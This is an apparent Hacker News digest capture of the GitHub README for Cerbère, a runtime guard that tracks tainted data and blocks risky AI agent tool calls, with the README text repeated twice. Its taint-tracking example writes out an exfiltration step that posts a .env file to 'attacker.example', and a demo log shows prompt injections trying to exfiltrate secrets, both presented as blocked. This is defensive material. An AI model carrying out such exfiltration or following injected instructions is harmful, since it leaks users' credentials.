---
source: "https://github.com/chrismsmr-celcom/cerbere-AG"
hn_url: "https://news.ycombinator.com/item?id=50198800"
title: "Cerbère – taint tracking for AI agents"
article_title: "GitHub - chrismsmr-celcom/cerbere-AG: Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI se\n[truncated]"
image: "https://opengraph.githubassets.com/1ec86fea996c131a120591578f8fdb97a8edb94b74893ff8644510780ecc3ff4/chrismsmr-celcom/cerbere-AG"
author: "Dikesa_27"
captured_at: "2026-10-22T18:20:48Z"
capture_tool: "hn-digest"
hn_id: 50198800
score: 2
comments: 0
posted_at: "2026-10-22T17:51:30Z"
tags:
  - hacker-news
---

# Cerbère – taint tracking for AI agents

- HN: [50198800](https://news.ycombinator.com/item?id=50198800)
- Source: [github.com](https://github.com/chrismsmr-celcom/cerbere-AG)
- Score: 2
- Comments: 0
- Posted: 2026-10-22T17:51:30Z

## Translation

Title: Cerbère – taint tracking for AI agents
Article title: GitHub - chrismsmr-celcom/cerbere-AG: Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI se
[truncated]
Description: Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️ - chrismsmr
[truncated]

Article text:
GitHub - chrismsmr-celcom/cerbere-AG: Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️ · GitHub
Skip to content
Navigation Menu
Sign in Appearance settings Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
Code Quality Enforce quality at merge
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search / Sign in Sign up Appearance settings
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
chrismsmr-celcom
cerbere-AG Public template Notifications You must be signed in to change notification settings
Star 9 ( 9 ) You must be signed in to star a repository
Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️
Readme Apache-2.0, License licenses found Contributing
Security policy Activity Stars
3 forks Report repository main Branches Tags Go to file Code Open more actions menu Latest commit
885 Commits 885 Commits Folders and files
.github .github agentguard agentguard app/ login app/ login benchmarks benchmarks collector collector dashboard dashboard docs docs examples examples legal legal mcp mcp policies policies policy policy scripts scripts static static tests tests tools tools .gitignore .gitignore .gitleaks.toml .gitleaks.toml .pre-commit-config.yaml .pre-commit-config.yaml AUTHORS.md AUTHORS.md CONTRIBUTING.md CONTRIBUTING.md Dockerfile Dockerfile Dockerfile.mcp Dockerfile.mcp LICENSE LICENSE LICENSE-COMMERCIAL.md LICENSE-COMMERCIAL.md NOTICE.md NOTICE.md Procfile Procfile README.md README.md README_MCP.md README_MCP.md SECURITY.md SECURITY.md agentguard_ml.py agentguard_ml.py agentguard_sdk.py agentguard_sdk.py bandit.json bandit.json demo_agent.py demo_agent.py demo_approval.py demo_approval.py demo_b64_exfil.py demo_b64_exfil.py demo_llm_cost.py demo_llm_cost.py demo_taint_tracking.py demo_taint_tracking.py docker-compose.yml docker-compose.yml env.example env.example generate_dataset.py generate_dataset.py google9ba43508890d04b0.html google9ba43508890d04b0.html judges.py judges.py pos.txt pos.txt pyproject.toml pyproject.toml render.yaml render.yaml requirements-dev.txt requirements-dev.txt requirements-ml.txt requirements-ml.txt requirements.txt requirements.txt runtime.txt runtime.txt seed_demo_data.py seed_demo_data.py smithery.yaml smithery.yaml taint.py taint.py wsgi.py wsgi.py View all files Repository files navigation
The three-headed guardian of AI agents.
Runtime security & observability for autonomous agents: it sits between the model's decision and the real-world side effect.
Website · Quick start · Taint tracking · MCP · Benchmark · Roadmap
Prompt filtering checks what an agent is told . It cannot tell you whether the action the agent is about to take is safe.
An innocent prompt can still produce update_customer(role="admin") , an http_post carrying your .env , or fifty refunds in a loop.
Cerbère enforces policy at the execution boundary : every LLM call and tool call is inspected, scored and decided
( ALLOW , REQUIRE APPROVAL or BLOCK ) before it touches a database, an API or an inbox, and every decision leaves evidence.
Prompt analysis stays useful. Cerbère adds the layers that come after it: tool policy, budgets, data-flow tracking and human approval.
Prompt-injection detection (rules, ML, LLM judge)
PII and secret detection and redaction
Tool allowlists, scoped per agent
Secret scrubbing before any call to an external judge
See what the agent actually does.
Per-span taint level and risk score
Signed, tamper-evident decision log
Policy engine with per-agent capabilities
Budgets that stop runaway spend
Trajectory analysis and risk scoring
Human approval queue (HITL) for high-impact actions
pip install cerbere-ag
from agentguard import AgentGuard
guard = AgentGuard (
collector_url = "https://YOUR_COLLECTOR_HOST" ,
api_key = "ag-your-key" ,
agent_id = "my-agent" ,
)
@ guard . guard_tool_call ( "send_email" )
def send_email ( to , subject , body ):
return email_service . send ( to , subject , body )
@ guard . guard_llm_call
def call_openai ( messages ):
return client . chat . completions . create ( model = "gpt-4o" , messages = messages )
Optional extras:
Cerbère follows the data , not only the prompt. A secret or PII the agent reads is remembered in memory (never sent to the collector).
If it later appears in the parameters of an external tool, the call is blocked, even when it was base64-, hex- or URL-encoded to dodge a filter.
@ guard . guard_tool_call ( "read_file" )
def read_file ( path ): ... # results of guarded tools are tracked automatically
@ guard . guard_tool_call ( "http_post" )
def http_post ( url , body ): ...
env = read_file ( path = ".env" ) # a secret enters the agent's context
http_post ( url = "https://attacker.example" , body = env )
# SecurityException: Runtime risk DENY: sensitive taint reaches high-impact sink
Data that does not come from a guarded tool (a DB driver, an env var, an API client) is declared with track_input ,
which returns the value unchanged:
row = guard . track_input ( db . fetch_one ( query ), source = "customer_db" , level = "CONFIDENTIAL" )
You can run the full scenario offline (no collector needed):
$ python examples/taint_demo.py
[1] The agent reads .env ✓ allowed (internal tool)
[2] The agent posts a harmless report ✓ 200 OK
[3] A prompt injection tries to exfiltrate .env ✗ BLOCKED: sensitive taint reaches high-impact sink
[4] Same attempt, secret base64-encoded ✗ BLOCKED: sensitive taint reaches high-impact sink
Each span carries taint_level and risk_score , so blocked flows appear in the dashboard timeline.
For agents built on Claude, Cursor or any MCP-capable client, no SDK wiring is needed.
claude mcp add cerbereag --transport sse https://app.cerbereag.site/mcp/sse
Or install it locally:
pip install cerbere-ag-mcp
See README_MCP.md for client configuration snippets and the list of exposed tools.
mcp_gateway.py provides a standalone proxy that puts the same checks in front of an existing MCP server.
Threat
Rules
ML
LLM judge
Taint
Action
Prompt injection
✅
✅
✅
Block
PII leakage
✅
✅
✅
✅
Redact / block
Data exfiltration to an external tool
✅
Block
Tool misuse
✅
✅
✅
Block / require approval
Unauthorized tools
✅
Block
Budget overflow
✅
Block
Ambiguous behavior
⚠️
✅
Review
Cerbère is defense in depth, not a guarantee that every attack will be detected.
Measured on benchmarks/corpus_2k , an internal corpus of 2,003 prompts: 1,000 attacks (7 categories), 703 benign prompts and 300 hard negatives (legitimate security requests: training material, detection tests). Version v5.5, SDK 0.6.1, CPU only. Method in benchmarks/METHODOLOGY.md , full report in docs/BENCHMARK.md .
95% confidence intervals for the full pipeline: recall [99.62%, 100%], FP benign [0%, 0.54%], FP hard negatives [0%, 1.26%].
Attacks caught by the rules answer in about 0.55 ms. The ML layer sees only what the rules let through, and the LLM arbiter sees only what the ML flagged, so most clean traffic never pays for the deeper layers.
Full-pipeline p95 is 2,716 ms: flagged requests wait for the arbiter. If the arbiter is unreachable, Cerbère falls back to rules + ML, fails closed, and false positives on benign traffic return to about 2.3%.
int8 quantization is off by default: it halves latency but drops recall to 74.2% on this model.
This corpus is ours, and the detection patterns were tuned against it. Results on independent public datasets will be published separately; treat these figures as a regression baseline, not a guarantee.
git clone https://github.com/chrismsmr-celcom/cerbere-AG.git
cd cerbere-AG
cp env.example .env # set AGENTGUARD_API_KEY, e.g. python -c "import secrets; print('ag-' + secrets.token_urlsafe(32))"
docker compose up -d # collector + PostgreSQL + Redis
Without Docker: pip install -r requirements.txt && gunicorn wsgi:app --bind 0.0.0.0:8080 , then open http://localhost:8080/ .
# Authentication
AGENTGUARD_API_KEY=ag-your-key
# Database (sqlite | postgres)
AGENTGUARD_DB_TYPE=sqlite
DATABASE_URL=postgresql://user:pass@localhost:5432/agentguard
# ML
AGENTGUARD_USE_ML=true
AGENTGUARD_MODEL_PATH=./agentguard-model
AGENTGUARD_ML_THRESHOLD=0.60
AGENTGUARD_ML_QUANTIZE=false
# LLM judge
AGENTGUARD_USE_LLM_JUDGE=true
AGENTGUARD_JUDGE_API_KEY=your-key
AGENTGUARD_JUDGE_MODEL=deepseek-chat
AGENTGUARD_BLOCK_ON_AMBIGUOUS=true
# Runtime
AGENTGUARD_RATE_LIMIT=300 per minute
AGENTGUARD_SPAN_RATE_LIMIT=150 per minute
AGENTGUARD_LOG_LEVEL=INFO
🔗 Integrations
LangChain
CrewAI
OpenAI
Anthropic
DeepSeek
MCP
✅
✅
✅
✅
✅
✅
Examples: langchain_example.py , crewai_example.py , mcp_example.py .
Cerbère sits at the execution boundary, so the underlying model does not need to change.
Status
Item
✅ Shipped
Three-layer detection · taint tracking · runtime risk and trajectory analysis · human approval queue · signed decisions · multi-tenant collector · MCP server · public benchmark
🔨 Next
Publish cerbere-ag-mcp · HTTP gateway for agents whose code cannot be changed · "Why was this blocked?" view · documentation site
🔭 Later
OpenTelemetry export · judge router across models · CLI · advanced RBAC
Roadmap items are subject to change.
Contributions are welcome for permitted non-commercial development. Read CONTRIBUTING.md , AUTHORS.md and NOTICE.md , then:
git checkout -b feature/my-feature
pytest -q
and open a Pull Request. To report a vulnerability, see SECURITY.md and please do not disclose exploitable details publicly.
Cerbère uses an open-core model.
Commercial licensing: contact@cerbereag.site
If you reference Cerbère in research or documentation, please credit Cerbère / AgentGuard, created by Christopher Dikesa .
Cerbère reduces risk in AI agent systems. It does not guarantee protection against prompt injection, data leakage, tool abuse or model vulnerabilities.
Do not rely on it as the sole security control for critical infrastructure.
Copyright © 2026 Christopher Dikesa
Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️
Readme Apache-2.0, License licenses found Contributing
Security policy Activity Stars
3 forks Report repository Releases
© 2026 GitHub, Inc.
Footer navigation
Do not share my personal information

## Original Extract

Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️ - chrismsmr
[truncated]

GitHub - chrismsmr-celcom/cerbere-AG: Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️ · GitHub
Skip to content
Navigation Menu
Sign in Appearance settings Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
Code Quality Enforce quality at merge
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search / Sign in Sign up Appearance settings
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
chrismsmr-celcom
cerbere-AG Public template Notifications You must be signed in to change notification settings
Star 9 ( 9 ) You must be signed in to star a repository
Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️
Readme Apache-2.0, License licenses found Contributing
Security policy Activity Stars
3 forks Report repository main Branches Tags Go to file Code Open more actions menu Latest commit
885 Commits 885 Commits Folders and files
.github .github agentguard agentguard app/ login app/ login benchmarks benchmarks collector collector dashboard dashboard docs docs examples examples legal legal mcp mcp policies policies policy policy scripts scripts static static tests tests tools tools .gitignore .gitignore .gitleaks.toml .gitleaks.toml .pre-commit-config.yaml .pre-commit-config.yaml AUTHORS.md AUTHORS.md CONTRIBUTING.md CONTRIBUTING.md Dockerfile Dockerfile Dockerfile.mcp Dockerfile.mcp LICENSE LICENSE LICENSE-COMMERCIAL.md LICENSE-COMMERCIAL.md NOTICE.md NOTICE.md Procfile Procfile README.md README.md README_MCP.md README_MCP.md SECURITY.md SECURITY.md agentguard_ml.py agentguard_ml.py agentguard_sdk.py agentguard_sdk.py bandit.json bandit.json demo_agent.py demo_agent.py demo_approval.py demo_approval.py demo_b64_exfil.py demo_b64_exfil.py demo_llm_cost.py demo_llm_cost.py demo_taint_tracking.py demo_taint_tracking.py docker-compose.yml docker-compose.yml env.example env.example generate_dataset.py generate_dataset.py google9ba43508890d04b0.html google9ba43508890d04b0.html judges.py judges.py pos.txt pos.txt pyproject.toml pyproject.toml render.yaml render.yaml requirements-dev.txt requirements-dev.txt requirements-ml.txt requirements-ml.txt requirements.txt requirements.txt runtime.txt runtime.txt seed_demo_data.py seed_demo_data.py smithery.yaml smithery.yaml taint.py taint.py wsgi.py wsgi.py View all files Repository files navigation
The three-headed guardian of AI agents.
Runtime security & observability for autonomous agents: it sits between the model's decision and the real-world side effect.
Website · Quick start · Taint tracking · MCP · Benchmark · Roadmap
Prompt filtering checks what an agent is told . It cannot tell you whether the action the agent is about to take is safe.
An innocent prompt can still produce update_customer(role="admin") , an http_post carrying your .env , or fifty refunds in a loop.
Cerbère enforces policy at the execution boundary : every LLM call and tool call is inspected, scored and decided
( ALLOW , REQUIRE APPROVAL or BLOCK ) before it touches a database, an API or an inbox, and every decision leaves evidence.
Prompt analysis stays useful. Cerbère adds the layers that come after it: tool policy, budgets, data-flow tracking and human approval.
Prompt-injection detection (rules, ML, LLM judge)
PII and secret detection and redaction
Tool allowlists, scoped per agent
Secret scrubbing before any call to an external judge
See what the agent actually does.
Per-span taint level and risk score
Signed, tamper-evident decision log
Policy engine with per-agent capabilities
Budgets that stop runaway spend
Trajectory analysis and risk scoring
Human approval queue (HITL) for high-impact actions
pip install cerbere-ag
from agentguard import AgentGuard
guard = AgentGuard (
collector_url = "https://YOUR_COLLECTOR_HOST" ,
api_key = "ag-your-key" ,
agent_id = "my-agent" ,
)
@ guard . guard_tool_call ( "send_email" )
def send_email ( to , subject , body ):
return email_service . send ( to , subject , body )
@ guard . guard_llm_call
def call_openai ( messages ):
return client . chat . completions . create ( model = "gpt-4o" , messages = messages )
Optional extras:
Cerbère follows the data , not only the prompt. A secret or PII the agent reads is remembered in memory (never sent to the collector).
If it later appears in the parameters of an external tool, the call is blocked, even when it was base64-, hex- or URL-encoded to dodge a filter.
@ guard . guard_tool_call ( "read_file" )
def read_file ( path ): ... # results of guarded tools are tracked automatically
@ guard . guard_tool_call ( "http_post" )
def http_post ( url , body ): ...
env = read_file ( path = ".env" ) # a secret enters the agent's context
http_post ( url = "https://attacker.example" , body = env )
# SecurityException: Runtime risk DENY: sensitive taint reaches high-impact sink
Data that does not come from a guarded tool (a DB driver, an env var, an API client) is declared with track_input ,
which returns the value unchanged:
row = guard . track_input ( db . fetch_one ( query ), source = "customer_db" , level = "CONFIDENTIAL" )
You can run the full scenario offline (no collector needed):
$ python examples/taint_demo.py
[1] The agent reads .env ✓ allowed (internal tool)
[2] The agent posts a harmless report ✓ 200 OK
[3] A prompt injection tries to exfiltrate .env ✗ BLOCKED: sensitive taint reaches high-impact sink
[4] Same attempt, secret base64-encoded ✗ BLOCKED: sensitive taint reaches high-impact sink
Each span carries taint_level and risk_score , so blocked flows appear in the dashboard timeline.
For agents built on Claude, Cursor or any MCP-capable client, no SDK wiring is needed.
claude mcp add cerbereag --transport sse https://app.cerbereag.site/mcp/sse
Or install it locally:
pip install cerbere-ag-mcp
See README_MCP.md for client configuration snippets and the list of exposed tools.
mcp_gateway.py provides a standalone proxy that puts the same checks in front of an existing MCP server.
Threat
Rules
ML
LLM judge
Taint
Action
Prompt injection
✅
✅
✅
Block
PII leakage
✅
✅
✅
✅
Redact / block
Data exfiltration to an external tool
✅
Block
Tool misuse
✅
✅
✅
Block / require approval
Unauthorized tools
✅
Block
Budget overflow
✅
Block
Ambiguous behavior
⚠️
✅
Review
Cerbère is defense in depth, not a guarantee that every attack will be detected.
Measured on benchmarks/corpus_2k , an internal corpus of 2,003 prompts: 1,000 attacks (7 categories), 703 benign prompts and 300 hard negatives (legitimate security requests: training material, detection tests). Version v5.5, SDK 0.6.1, CPU only. Method in benchmarks/METHODOLOGY.md , full report in docs/BENCHMARK.md .
95% confidence intervals for the full pipeline: recall [99.62%, 100%], FP benign [0%, 0.54%], FP hard negatives [0%, 1.26%].
Attacks caught by the rules answer in about 0.55 ms. The ML layer sees only what the rules let through, and the LLM arbiter sees only what the ML flagged, so most clean traffic never pays for the deeper layers.
Full-pipeline p95 is 2,716 ms: flagged requests wait for the arbiter. If the arbiter is unreachable, Cerbère falls back to rules + ML, fails closed, and false positives on benign traffic return to about 2.3%.
int8 quantization is off by default: it halves latency but drops recall to 74.2% on this model.
This corpus is ours, and the detection patterns were tuned against it. Results on independent public datasets will be published separately; treat these figures as a regression baseline, not a guarantee.
git clone https://github.com/chrismsmr-celcom/cerbere-AG.git
cd cerbere-AG
cp env.example .env # set AGENTGUARD_API_KEY, e.g. python -c "import secrets; print('ag-' + secrets.token_urlsafe(32))"
docker compose up -d # collector + PostgreSQL + Redis
Without Docker: pip install -r requirements.txt && gunicorn wsgi:app --bind 0.0.0.0:8080 , then open http://localhost:8080/ .
# Authentication
AGENTGUARD_API_KEY=ag-your-key
# Database (sqlite | postgres)
AGENTGUARD_DB_TYPE=sqlite
DATABASE_URL=postgresql://user:pass@localhost:5432/agentguard
# ML
AGENTGUARD_USE_ML=true
AGENTGUARD_MODEL_PATH=./agentguard-model
AGENTGUARD_ML_THRESHOLD=0.60
AGENTGUARD_ML_QUANTIZE=false
# LLM judge
AGENTGUARD_USE_LLM_JUDGE=true
AGENTGUARD_JUDGE_API_KEY=your-key
AGENTGUARD_JUDGE_MODEL=deepseek-chat
AGENTGUARD_BLOCK_ON_AMBIGUOUS=true
# Runtime
AGENTGUARD_RATE_LIMIT=300 per minute
AGENTGUARD_SPAN_RATE_LIMIT=150 per minute
AGENTGUARD_LOG_LEVEL=INFO
🔗 Integrations
LangChain
CrewAI
OpenAI
Anthropic
DeepSeek
MCP
✅
✅
✅
✅
✅
✅
Examples: langchain_example.py , crewai_example.py , mcp_example.py .
Cerbère sits at the execution boundary, so the underlying model does not need to change.
Status
Item
✅ Shipped
Three-layer detection · taint tracking · runtime risk and trajectory analysis · human approval queue · signed decisions · multi-tenant collector · MCP server · public benchmark
🔨 Next
Publish cerbere-ag-mcp · HTTP gateway for agents whose code cannot be changed · "Why was this blocked?" view · documentation site
🔭 Later
OpenTelemetry export · judge router across models · CLI · advanced RBAC
Roadmap items are subject to change.
Contributions are welcome for permitted non-commercial development. Read CONTRIBUTING.md , AUTHORS.md and NOTICE.md , then:
git checkout -b feature/my-feature
pytest -q
and open a Pull Request. To report a vulnerability, see SECURITY.md and please do not disclose exploitable details publicly.
Cerbère uses an open-core model.
Commercial licensing: contact@cerbereag.site
If you reference Cerbère in research or documentation, please credit Cerbère / AgentGuard, created by Christopher Dikesa .
Cerbère reduces risk in AI agent systems. It does not guarantee protection against prompt injection, data leakage, tool abuse or model vulnerabilities.
Do not rely on it as the sole security control for critical infrastructure.
Copyright © 2026 Christopher Dikesa
Welcome to cerbere-agent guard, originally just agent guard, then rebranded after the mythical hound of the underworld. Our mission? Guarding your AI agents, keeping them in line, and blocking unauthorized actions. Think of it as the ultimate guard dog for AI security and guardrails. 🐕🛡️
Readme Apache-2.0, License licenses found Contributing
Security policy Activity Stars
3 forks Report repository Releases
© 2026 GitHub, Inc.
Footer navigation
Do not share my personal information
